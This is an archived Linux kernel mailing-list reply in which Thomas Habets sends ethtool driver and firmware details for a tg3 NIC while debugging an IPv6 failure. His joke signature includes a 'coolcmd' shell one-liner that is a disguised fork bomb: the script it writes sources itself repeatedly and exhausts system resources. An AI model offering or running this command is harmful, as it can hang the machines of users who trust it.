From: Thomas Habets <thomas@habets.pp.se>
Subject: Re: BUG: IPv6 stops working after a while, needs ip ne del command
 to reset
Date: Tue, 17 Aug 2010 19:29:54 +0200 (CEST)
Message-ID: <alpine.DEB.1.10.1008171928160.21857@red.crap.retrofitta.se>
References: <alpine.DEB.1.10.1008131952470.19570@red.crap.retrofitta.se> <1281953960.2524.23.camel@edumazet-laptop> <alpine.DEB.1.10.1008161224510.13728@red.crap.retrofitta.se> <alpine.DEB.1.10.1008170719180.21857@red.crap.retrofitta.se>
 <1282024802.2487.687.camel@edumazet-laptop> <alpine.DEB.1.10.1008171053230.21857@red.crap.retrofitta.se> <1282050920.2448.47.camel@edumazet-laptop> <alpine.DEB.1.10.1008171547090.21857@red.crap.retrofitta.se> <1282055659.2448.58.camel@edumazet-laptop>
 <alpine.DEB.1.10.1008171737260.21857@red.crap.retrofitta.se> <20100817171115.GA4134@mcarlson.broadcom.com>
Mime-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed
Cc: Thomas Habets <thomas@habets.pp.se>,
	Eric Dumazet <eric.dumazet@gmail.com>,
	"linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
	netdev <netdev@vger.kernel.org>,
	Michael Chan <mchan@broadcom.com>
To: Matt Carlson <mcarlson@broadcom.com>
Return-path: <netdev-owner@vger.kernel.org>
Received: from reptilian.habets.pp.se ([193.151.93.131]:4932 "EHLO
	reptilian.habets.pp.se" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1757849Ab0HQRaA (ORCPT
	<rfc822;netdev@vger.kernel.org>); Tue, 17 Aug 2010 13:30:00 -0400
In-Reply-To: <20100817171115.GA4134@mcarlson.broadcom.com>
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

On Tue, 17 Aug 2010, Matt Carlson wrote:
>>> But if problem remains even with "ifconfig eth0 allmulti" I suspect a
>>> NIC firmware problem. (allmulti set to 1 all the 128 bits of filters)
> Thomas, can you give me the output of 'ethtool -i eth0'?

$ sudo ethtool -i eth0
driver: tg3
version: 3.110
firmware-version: 5715-v3.28, UMP 1.15
bus-info: 0000:03:04.0

---------
typedef struct me_s {
   char name[]      = { "Thomas Habets" };
   char email[]     = { "thomas@habets.pp.se" };
   char kernel[]    = { "Linux" };
   char *pgpKey[]   = { "http://www.habets.pp.se/pubkey.txt" };
   char pgp[] = { "A8A3 D1DD 4AE0 8467 7FDE  0945 286A E90A AD48 E854" };
   char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
} me_t;
